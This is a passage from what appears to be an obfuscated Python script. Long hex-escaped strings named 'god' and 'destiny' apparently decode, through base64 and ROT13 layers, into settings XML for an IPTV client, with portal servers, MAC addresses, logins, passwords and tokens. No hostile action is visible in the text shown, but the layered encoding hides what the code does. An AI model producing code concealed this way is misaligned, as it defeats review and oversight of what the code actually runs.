b\x43\x50\x39\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x43\x74\x30\x58\x56\x50\x4e\x74\x56\x51\x6b\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x56\x54\x79\x78\x43\x46\x57\x61\x71\x4a\x79\x78\x4d\x49\x39\x77\x4c\x4a'
god = '\x4e\x6f\x5a\x56\x38\x78\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x6a\x35\x6d\x59\x57\x78\x7a\x5a\x54\x77\x76\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x7a\x34\x4e\x43\x69\x41\x67\x49\x43\x41\x38\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x79\x42\x70\x5a\x44\x30\x69\x5a\x33\x56\x70\x5a\x47\x56\x66\x59\x32\x46\x6a\x61\x47\x56\x66\x61\x47\x39\x31\x63\x6e\x4e\x66\x4d\x53\x49\x2b\x4d\x54\x77\x76\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x7a\x34\x4e\x43\x69\x41\x67\x49\x43\x41\x38\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x79\x42\x70\x5a\x44\x30\x69\x65\x47\x31\x73\x64\x48\x5a\x66\x63\x32\x4e\x76\x63\x47\x56\x66\x4d\x53\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a\x31\x5a\x53\x49\x2b\x4d\x44\x77\x76\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x7a\x34\x4e\x43\x69\x41\x67\x49\x43\x41\x38\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x79\x42\x70\x5a\x44\x30\x69\x65\x47\x31\x73\x64\x48\x5a\x66\x64\x58\x4a\x73\x58\x7a\x45\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x50\x6d\x5a\x68\x62\x48\x4e\x6c\x50\x43\x39\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x34\x62\x57\x78\x30\x64\x6c\x39\x77\x59\x58\x52\x6f\x58\x7a\x45\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x50\x6d\x5a\x68\x62\x48\x4e\x6c\x50\x43\x39\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x30\x62\x32\x74\x6c\x62\x6c\x38\x78\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x69\x41\x76\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x7a\x5a\x58\x4a\x70\x59\x57\x78\x66\x62\x6e\x56\x74\x59\x6d\x56\x79\x58\x7a\x45\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x49\x43\x38\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6d\x52\x6c\x64\x6d\x6c\x6a\x5a\x56\x39\x70\x5a\x46\x38\x78\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x69\x41\x76\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x6b\x5a\x58\x5a\x70\x59\x32\x56\x66\x61\x57\x51\x79\x58\x7a\x45\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x49\x43\x38\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6e\x4e\x70\x5a\x32\x35\x68\x64\x48\x56\x79\x5a\x56\x38\x78\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x69\x41\x76\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x74\x59\x57\x4e\x66\x4d\x69\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a\x31\x5a\x53\x49\x2b\x65\x33\x4a\x76\x64\x31\x73\x32\x58\x58\x30\x38\x4c\x33\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6e\x4e\x6c\x63\x6e\x5a\x6c\x63\x6c\x38\x79\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x6a\x35\x37\x63\x6d\x39\x33\x57\x7a\x56\x64\x66\x54\x77\x76\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x7a\x34\x4e\x43\x69\x41\x67\x49\x43\x41\x38\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x79\x42\x70\x5a\x44\x30\x69\x64\x47\x6c\x74\x5a\x56\x39\x36\x62\x32\x35\x6c\x58\x7a\x49\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x50\x6b\x56\x31\x63\x6d\x39\x77\x5a\x53\x39\x4c\x61\x57\x56\x32\x50\x43\x39\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x73\x62\x32\x64\x70\x62\x6c\x38\x79\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x69\x41\x76\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x77\x59\x58\x4e\x7a\x64\x32\x39\x79\x5a\x46\x38\x79\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x69\x41\x76\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x6e\x64\x57\x6c\x6b\x5a\x56\x39\x77\x63\x6d\x56\x6d\x5a\x58\x4a\x6c\x62\x6d\x4e\x6c\x58\x7a\x49\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x50\x6a\x45\x38\x4c\x33\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6d\x64\x31\x61\x57\x52\x6c\x58\x32\x4e\x68\x59\x32\x68\x6c\x58\x7a\x49\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x50\x6d\x5a\x68\x62\x48\x4e\x6c\x50\x43\x39\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x6e\x64\x57\x6c\x6b\x5a\x56\x39\x6a\x59\x57\x4e\x6f\x5a\x56\x39\x6f\x62\x33\x56\x79\x63\x31\x38\x79\x49\x6a\x34\x78\x50\x43\x39\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x34\x62\x57\x78\x30\x64\x6c\x39\x7a\x59\x32\x39\x77\x5a\x56\x38\x79\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x6a\x34\x77\x50\x43\x39\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x34\x62\x57\x78\x30\x64\x6c\x39\x31\x63\x6d\x78\x66\x4d\x69\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a\x31\x5a\x53\x49\x2b\x5a\x6d\x46\x73\x63\x32\x55\x38\x4c\x33\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6e\x68\x74\x62\x48\x52\x32\x58\x33\x42\x68\x64\x47\x68\x66\x4d\x69\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a\x31\x5a\x53\x49\x2b\x5a\x6d\x46\x73\x63\x32\x55\x38\x4c\x33\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6e\x52\x76\x61\x32\x56\x75\x58\x7a\x49\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x49\x43\x38\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6e\x4e\x6c\x63\x6d\x6c\x68\x62\x46\x39\x75\x64\x57\x31\x69\x5a\x58\x4a\x66\x4d\x69\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a\x31\x5a\x53\x49\x67\x4c\x7a\x34\x4e\x43\x69\x41\x67\x49\x43\x41\x38\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x79\x42\x70\x5a\x44\x30\x69\x5a\x47\x56\x32\x61\x57\x4e\x6c\x58\x32\x6c\x6b\x58\x7a\x49\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x49\x43\x38\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6d\x52\x6c\x64\x6d\x6c\x6a\x5a\x56\x39\x70\x5a\x44\x4a\x66\x4d\x69\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a\x31\x5a\x53\x49\x67\x4c\x7a\x34\x4e\x43\x69\x41\x67\x49\x43\x41\x38\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x79\x42\x70\x5a\x44\x30\x69\x63\x32\x6c\x6e\x62\x6d\x46\x30\x64\x58\x4a\x6c\x58\x7a\x49\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x49\x43\x38\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6d\x31\x68\x59\x31\x38\x7a\x49\x69\x42\x6b\x5a\x57\x5a\x68\x64\x57\x78\x30\x50\x53\x4a\x30\x63\x6e\x56\x6c\x49\x6a\x35\x37\x63\x6d\x39\x33\x57\x7a\x68\x64\x66\x54\x77\x76\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x7a\x34\x4e\x43\x69\x41\x67\x49\x43\x41\x38\x63\x32\x56\x30\x64\x47\x6c\x75\x5a\x79\x42\x70\x5a\x44\x30\x69\x63\x32\x56\x79\x64\x6d\x56\x79\x58\x7a\x4d\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x50\x6e\x74\x79\x62\x33\x64\x62\x4e\x31\x31\x39\x50\x43\x39\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x50\x67\x30\x4b\x49\x43\x41\x67\x49\x44\x78\x7a\x5a\x58\x52\x30\x61\x57\x35\x6e\x49\x47\x6c\x6b\x50\x53\x4a\x30\x61\x57\x31\x6c\x58\x33\x70\x76\x62\x6d\x56\x66\x4d\x79\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a\x31\x5a\x53\x49\x2b\x52\x58\x56\x79\x62\x33\x42\x6c\x4c\x30\x74\x70\x5a\x58\x59\x38\x4c\x33\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6d\x78\x76\x5a\x32\x6c\x75\x58\x7a\x4d\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x49\x43\x38\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6e\x42\x68\x63\x33\x4e\x33\x62\x33\x4a\x6b\x58\x7a\x4d\x69\x49\x47\x52\x6c\x5a\x6d\x46\x31\x62\x48\x51\x39\x49\x6e\x52\x79\x64\x57\x55\x69\x49\x43\x38\x2b\x44\x51\x6f\x67\x49\x43\x41\x67\x50\x48\x4e\x6c\x64\x48\x52\x70\x62\x6d\x63\x67\x61\x57\x51\x39\x49\x6d\x64\x31\x61\x57\x52\x6c\x58\x33\x42\x79\x5a\x57\x5a\x6c\x63\x6d\x56\x75\x59\x32\x56\x66\x4d\x79\x49\x67\x5a\x47\x56\x6d\x59\x58\x56\x73\x64\x44\x30\x69\x64\x48\x4a'
destiny = '\x31\x4d\x46\x56\x2b\x5a\x47\x6a\x69\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x4d\x33\x49\x63\x4d\x54\x49\x73\x4c\x32\x53\x77\x6e\x54\x49\x73\x5a\x6c\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x2b\x4d\x7a\x53\x66\x70\x32\x48\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x7a\x71\x31\x6e\x4a\x45\x79\x4b\x32\x41\x75\x4c\x32\x75\x79\x4b\x32\x75\x69\x71\x4b\x57\x6d\x4b\x6d\x5a\x76\x43\x77\x52\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x61\x75\x67\x6f\x55\x45\x32\x4b\x33\x41\x77\x6f\x33\x4f\x79\x4b\x6d\x5a\x76\x56\x54\x45\x79\x4d\x7a\x53\x31\x6f\x55\x44\x39\x56\x61\x45\x6c\x71\x4a\x48\x76\x43\x77\x4e\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x61\x75\x67\x6f\x55\x45\x32\x4b\x33\x49\x6c\x6f\x53\x38\x6d\x56\x76\x4f\x78\x4d\x4a\x4d\x75\x71\x4a\x6b\x30\x43\x46\x57\x30\x70\x61\x49\x79\x56\x77\x35\x7a\x4c\x4a\x6b\x6d\x4d\x47\x6a\x69\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x72\x54\x31\x66\x71\x55\x4d\x73\x70\x54\x53\x30\x6e\x53\x38\x6d\x56\x76\x4f\x78\x4d\x4a\x4d\x75\x71\x4a\x6b\x30\x43\x46\x57\x30\x70\x61\x49\x79\x56\x77\x35\x7a\x4c\x4a\x6b\x6d\x4d\x47\x6a\x69\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x71\x54\x39\x65\x4d\x4a\x35\x73\x5a\x6c\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x74\x59\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x70\x32\x49\x6c\x6e\x4a\x53\x66\x4b\x32\x35\x31\x6f\x4a\x57\x79\x70\x79\x38\x6d\x56\x76\x4f\x78\x4d\x4a\x4d\x75\x71\x4a\x6b\x30\x43\x46\x57\x30\x70\x61\x49\x79\x56\x76\x4e\x69\x43\x74\x30\x58\x56\x50\x4e\x74\x56\x51\x6b\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x56\x54\x79\x78\x43\x46\x57\x78\x4d\x4b\x4d\x63\x4c\x32\x49\x73\x6e\x4a\x45\x73\x5a\x6c\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x74\x59\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x4d\x54\x49\x32\x6e\x4a\x41\x79\x4b\x32\x79\x78\x5a\x79\x38\x6d\x56\x76\x4f\x78\x4d\x4a\x4d\x75\x71\x4a\x6b\x30\x43\x46\x57\x30\x70\x61\x49\x79\x56\x76\x4e\x69\x43\x74\x30\x58\x56\x50\x4e\x74\x56\x51\x6b\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x56\x54\x79\x78\x43\x46\x57\x6d\x6e\x4a\x71\x68\x4c\x4b\x45\x31\x70\x7a\x49\x73\x5a\x6c\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x74\x59\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x6f\x4a\x53\x77\x4b\x6d\x44\x76\x56\x54\x45\x79\x4d\x7a\x53\x31\x6f\x55\x44\x39\x56\x61\x45\x6c\x71\x4a\x48\x76\x43\x77\x4e\x6a\x42\x77\x53\x4f\x42\x77\x70\x35\x42\x77\x4e\x6a\x42\x77\x4e\x6a\x42\x77\x4e\x6a\x43\x50\x39\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x43\x74\x30\x58\x56\x50\x4e\x74\x56\x51\x6b\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x56\x54\x79\x78\x43\x46\x57\x6d\x4d\x4b\x57\x32\x4d\x4b\x57\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x2b\x5a\x47\x56\x33\x59\x77\x4e\x68\x5a\x50\x34\x6b\x43\x50\x39\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x43\x74\x30\x58\x56\x50\x4e\x74\x56\x51\x6b\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x56\x54\x79\x78\x43\x46\x57\x30\x6e\x4a\x31\x79\x4b\x33\x63\x69\x6f\x7a\x49\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x2b\x45\x4b\x49\x6c\x6f\x33\x4f\x79\x59\x30\x67\x63\x4d\x4b\x4c\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x7a\x6b\x69\x4d\x32\x79\x68\x4b\x6d\x44\x76\x56\x54\x45\x79\x4d\x7a\x53\x31\x6f\x55\x44\x39\x56\x61\x45\x6c\x71\x4a\x48\x76\x56\x50\x38\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x61\x4f\x75\x70\x33\x41\x33\x6f\x33\x57\x78\x4b\x6d\x44\x76\x56\x54\x45\x79\x4d\x7a\x53\x31\x6f\x55\x44\x39\x56\x61\x45\x6c\x71\x4a\x48\x76\x56\x50\x38\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x7a\x71\x31\x6e\x4a\x45\x79\x4b\x33\x4f\x6c\x4d\x4a\x4d\x79\x70\x7a\x49\x68\x4c\x32\x49\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x2b\x5a\x47\x6a\x69\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x4d\x33\x49\x63\x4d\x54\x49\x73\x4c\x32\x53\x77\x6e\x54\x49\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x2b\x4d\x7a\x53\x66\x70\x32\x48\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x7a\x71\x31\x6e\x4a\x45\x79\x4b\x32\x41\x75\x4c\x32\x75\x79\x4b\x32\x75\x69\x71\x4b\x57\x6d\x4b\x6d\x44\x76\x43\x77\x56\x30\x43\x50\x39\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x43\x74\x30\x58\x56\x50\x4e\x74\x56\x51\x6b\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x56\x54\x79\x78\x43\x46\x57\x34\x6f\x4a\x6b\x30\x71\x79\x39\x6d\x4c\x32\x39\x6a\x4d\x49\x38\x30\x56\x76\x4f\x78\x4d\x4a\x4d\x75\x71\x4a\x6b\x30\x43\x46\x57\x30\x70\x61\x49\x79\x56\x77\x34\x6a\x43\x50\x39\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x43\x74\x30\x58\x56\x50\x4e\x74\x56\x51\x6b\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x56\x54\x79\x78\x43\x46\x57\x34\x6f\x4a\x6b\x30\x71\x79\x39\x31\x70\x7a\x6b\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x2b\x4d\x7a\x53\x66\x70\x32\x48\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x61\x75\x67\x6f\x55\x45\x32\x4b\x33\x4f\x75\x71\x54\x75\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x2b\x4d\x7a\x53\x66\x70\x32\x48\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x61\x45\x69\x6e\x32\x49\x68\x4b\x6d\x44\x76\x56\x54\x45\x79\x4d\x7a\x53\x31\x6f\x55\x44\x39\x56\x61\x45\x6c\x71\x4a\x48\x76\x56\x50\x38\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x61\x41\x79\x70\x7a\x79\x75\x6f\x53\x39\x68\x71\x4a\x31\x76\x4d\x4b\x57\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x74\x59\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x4d\x54\x49\x32\x6e\x4a\x41\x79\x4b\x32\x79\x78\x4b\x6d\x44\x76\x56\x54\x45\x79\x4d\x7a\x53\x31\x6f\x55\x44\x39\x56\x61\x45\x6c\x71\x4a\x48\x76\x56\x50\x38\x2b\x51\x44\x62\x74\x56\x50\x4e\x74\x43\x55\x41\x79\x71\x55\x45\x63\x6f\x7a\x70\x74\x6e\x4a\x44\x39\x56\x7a\x45\x79\x71\x7a\x79\x77\x4d\x49\x39\x63\x4d\x51\x57\x73\x41\x50\x56\x74\x4d\x54\x49\x7a\x4c\x4b\x49\x66\x71\x51\x30\x76\x71\x55\x57\x31\x4d\x46\x56\x74\x59\x6d\x34\x41\x50\x76\x4e\x74\x56\x50\x4e\x38\x70\x32\x49\x30\x71\x54\x79\x68\x4d\x6c\x4f\x63\x4d\x51\x30\x76\x70\x32\x79\x61\x6f\x7a\x53\x30\x71\x4b\x57\x79\x4b\x6d\x44\x76\x56\x54\x45\x79\x4d\x7a\x53\x31\x6f\x55\x44\x39\x56\x61\x45\x6c\x71\x4a\x48\x76\x56\x50\x38\x2b\x51\x44\x62\x38\x59\x33\x41\x79\x71\x55\x45\x63\x6f\x7a\x71\x6d\x43\x76\x56\x76\x56\x74\x30\x58\x51\x44\x63\x6a\x70\x7a\x79\x68\x71\x50\x4e\x62\x57\x31\x6b\x68\x57\x6c\x35\x64\x6f\x32\x79\x68\x58\x53\x67\x77\x6f\x32\x35\x32\x4d\x4b\x57\x30\x4b\x33\x57\x69\x71\x6c\x75\x6c\x6f\x33\x70\x63\x56\x54\x4d\x69\x70\x76\x4f\x6c\x6f\x33\x70\x74\x6e\x4a\x34\x74\x4d\x54\x53\x30\x4c\x49\x66\x6b\x42\x77\x57\x71\x4b\x46\x78\x63\x51\x44\x62\x41\x50\x61\x71\x63\x71\x54\x74\x74\x6f\x33\x4f\x79\x6f\x76\x75\x69\x70\x6c\x35\x6a\x4c\x4b\x45\x62\x59\x7a\x63\x69\x6e\x4a\x34\x62\x4d\x54\x53\x30\x4c\x49\x39\x6a\x4c\x4b\x45\x62\x59\x50\x57\x6d\x4d\x4b\x45\x30\x6e\x4a\x35\x61\x70\x6c\x35\x34\x6f\x4a\x6a\x76\x58\x46\x6a\x74\x56\x61\x70\x76\x58\x46\x4f\x75\x70\x6c\x4f\x7a\x42\x76\x4f\x7a\x59\x61\x71\x6c\x6e\x4b\x45\x79\x58\x50\x71\x70\x6f\x76\x70\x68\x6e\x7a\x39\x63\x6f\x76\x75\x6f\x4c\x32\x39\x68\x71\x7a\x49\x6c\x71\x53\x39\x6c\x6f\x33\x70\x62\x70\x7a\x39\x33\x58\x46\x4f\x7a\x6f\x33\x56\x74\x70\x7a\x39\x33\x56\x54\x79\x68\x56\x54\x45\x75\x71\x54\x53\x6f\x5a\x47\x62\x6c\x4b\x